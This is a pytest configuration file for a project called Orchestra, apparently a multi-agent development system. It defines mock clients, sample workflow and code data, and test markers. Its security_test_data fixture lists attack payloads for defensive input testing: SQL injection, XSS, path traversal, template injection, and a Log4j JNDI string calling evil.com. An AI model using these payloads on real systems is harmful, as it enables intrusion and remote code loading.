"""Pytest configuration and shared fixtures for Orchestra tests."""

import os
import tempfile
from pathlib import Path
from typing import Any, Dict, Generator
from unittest.mock import AsyncMock, Mock

import pytest
import structlog

from src.config.settings import Settings
from src.utils.logging import clear_context, configure_logging

# Configure test logging
configure_logging(log_level="DEBUG", json_logs=False, enable_audit=True)
logger = structlog.get_logger(__name__)


# Note: Using pytest-asyncio's default event_loop fixture instead of custom one


@pytest.fixture(autouse=True)
def setup_test_logging():
    """Setup logging for each test and clear context after."""
    # Clear any existing context
    clear_context()

    # Setup test-specific correlation ID
    from src.utils.logging import set_correlation_id

    set_correlation_id("test-correlation-id")

    yield

    # Clear context after test
    clear_context()


@pytest.fixture
def test_settings() -> Settings:
    """Provide test settings with safe defaults."""
    # Create temporary environment variables for testing
    test_env = {
        "ENVIRONMENT": "test",
        "DEBUG": "true",
        "OPENAI_API_KEY": "sk-test-key-for-testing-only",
        "PINECONE_API_KEY": "test-pinecone-key",
        "PINECONE_ENVIRONMENT": "test-environment",
        "POSTGRES_PASSWORD": "test-password",
        "LOG_LEVEL": "DEBUG",
    }

    # Temporarily set environment variables
    original_env = {}
    for key, value in test_env.items():
        original_env[key] = os.environ.get(key)
        os.environ[key] = value

    try:
        # Create fresh settings instance
        settings = Settings()
        yield settings
    finally:
        # Restore original environment
        for key, original_value in original_env.items():
            if original_value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = original_value


@pytest.fixture
def temp_dir() -> Generator[Path, None, None]:
    """Provide a temporary directory for test files."""
    with tempfile.TemporaryDirectory() as temp_dir:
        yield Path(temp_dir)


@pytest.fixture
def mock_openai_client():
    """Mock OpenAI client for testing."""
    mock_client = AsyncMock()

    # Mock chat completions
    mock_completion = Mock()
    mock_completion.choices = [Mock()]
    mock_completion.choices[0].message = Mock()
    mock_completion.choices[0].message.content = "Test AI response"

    # Use AsyncMock for the create method so we can track calls
    mock_client.chat.completions.create = AsyncMock(return_value=mock_completion)

    # Mock embeddings
    mock_embedding = Mock()
    mock_embedding.data = [Mock()]
    mock_embedding.data[0].embedding = [0.1] * 3072  # text-embedding-3-large dimension

    mock_client.embeddings.create = AsyncMock(return_value=mock_embedding)

    return mock_client


@pytest.fixture
def mock_pinecone_client():
    """Mock Pinecone client for testing."""
    mock_client = Mock()

    # Mock index operations
    mock_index = Mock()
    mock_index.upsert.return_value = {"upserted_count": 1}
    mock_index.query.return_value = {
        "matches": [{"id": "test-id", "score": 0.95, "metadata": {"test": "data"}}]
    }
    mock_client.Index.return_value = mock_index

    return mock_client


@pytest.fixture
def mock_temporal_client():
    """Mock Temporal client for testing."""
    mock_client = AsyncMock()

    # Mock workflow operations
    mock_handle = AsyncMock()
    mock_handle.result.return_value = "Test workflow result"
    mock_client.start_workflow.return_value = mock_handle

    return mock_client


@pytest.fixture
def sample_workflow_data() -> Dict[str, Any]:
    """Provide sample workflow data for testing."""
    return {
        "id": "test-workflow-123",
        "name": "Test Development Workflow",
        "status": "running",
        "started_at": "2024-01-01T00:00:00Z",
        "agents": ["orchestrator", "developer", "release"],
        "tasks": [
            {
                "id": "task-1",
                "name": "Generate Code",
                "status": "completed",
                "agent": "developer",
            },
            {
                "id": "task-2",
                "name": "Run Tests",
                "status": "running",
                "agent": "developer",
            },
        ],
    }


@pytest.fixture
def sample_agent_data() -> Dict[str, Any]:
    """Provide sample agent data for testing."""
    return {
        "name": "test-agent",
        "type": "developer",
        "status": "active",
        "capabilities": ["code_generation", "testing"],
        "current_task": "test-task-123",
        "metrics": {
            "tasks_completed": 5,
            "success_rate": 0.95,
            "average_response_time": 2.5,
        },
    }


@pytest.fixture
def sample_code_data() -> Dict[str, str]:
    """Provide sample code data for testing."""
    return {
        "python_function": '''
def calculate_sum(a: int, b: int) -> int:
    """Calculate the sum of two integers."""
    return a + b
'''.strip(),
        "python_class": '''
class TestClass:
    """A test class for demonstration."""

    def __init__(self, value: int):
        self.value = value

    def get_value(self) -> int:
        """Get the stored value."""
        return self.value
'''.strip(),
        "test_file": '''
import pytest
from src.example import calculate_sum


def test_calculate_sum():
    """Test the calculate_sum function."""
    assert calculate_sum(2, 3) == 5
    assert calculate_sum(-1, 1) == 0
    assert calculate_sum(0, 0) == 0
'''.strip(),
    }


@pytest.fixture
async def async_test_client():
    """Provide an async test client for testing async operations."""

    # This would be used for testing async endpoints or services
    # For now, it's a placeholder that could be extended
    class AsyncTestClient:
        async def get(self, url: str) -> Dict[str, Any]:
            return {"status": "ok", "url": url}

        async def post(self, url: str, data: Dict[str, Any]) -> Dict[str, Any]:
            return {"status": "created", "url": url, "data": data}

    return AsyncTestClient()


# Test markers for organizing tests
pytest_plugins = []


# Custom markers
def pytest_configure(config):
    """Configure custom pytest markers."""
    config.addinivalue_line(
        "markers", "slow: marks tests as slow (deselect with '-m \"not slow\"')"
    )
    config.addinivalue_line("markers", "integration: marks tests as integration tests")
    config.addinivalue_line("markers", "security: marks tests as security tests")
    config.addinivalue_line("markers", "unit: marks tests as unit tests")


# Test collection hooks
def pytest_collection_modifyitems(config, items):
    """Modify test items during collection."""
    # Add markers based on test location
    for item in items:
        # Mark tests in integration directory
        if "integration" in str(item.fspath):
            item.add_marker(pytest.mark.integration)

        # Mark tests in security directory
        if "security" in str(item.fspath):
            item.add_marker(pytest.mark.security)

        # Mark tests with "slow" in name as slow
        if "slow" in item.name.lower():
            item.add_marker(pytest.mark.slow)


# Async test utilities
class AsyncTestCase:
    """Base class for async test cases."""

    @pytest.fixture(autouse=True)
    def setup_async_test(self, event_loop):
        """Setup for async tests."""
        self.loop = event_loop

    async def async_setup(self):
        """Override this method for async setup."""
        pass

    async def async_teardown(self):
        """Override this method for async teardown."""
        pass


# Database test utilities
@pytest.fixture
def mock_database():
    """Mock database for testing."""

    class MockDatabase:
        def __init__(self):
            self.data = {}

        async def get(self, key: str) -> Any:
            return self.data.get(key)

        async def set(self, key: str, value: Any) -> None:
            self.data[key] = value

        async def delete(self, key: str) -> None:
            self.data.pop(key, None)

        def clear(self) -> None:
            self.data.clear()

    return MockDatabase()


# Security test utilities
@pytest.fixture
def security_test_data() -> Dict[str, Any]:
    """Provide data for security testing."""
    return {
        "malicious_inputs": [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "{{ 7*7 }}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j injection
        ],
        "sensitive_patterns": [
            "password=secret123",
            "api_key=sk-1234567890abcdef",
            "token=ghp_abcdefghijklmnop",
            "secret_key=very_secret_key",
        ],
        "safe_inputs": [
            "normal text input",
            "user@example.com",
            "2024-01-01",
            "valid_filename.py",
        ],
    }


# Performance test utilities
@pytest.fixture
def performance_monitor():
    """Monitor performance during tests."""
    import time

    class PerformanceMonitor:
        def __init__(self):
            self.start_time = None
            self.end_time = None

        def start(self):
            self.start_time = time.time()

        def stop(self):
            self.end_time = time.time()

        @property
        def duration(self) -> float:
            if self.start_time and self.end_time:
                return self.end_time - self.start_time
            return 0.0

        def assert_duration_less_than(self, max_duration: float):
            assert (
                self.duration < max_duration
            ), f"Test took {self.duration}s, expected < {max_duration}s"

    return PerformanceMonitor()
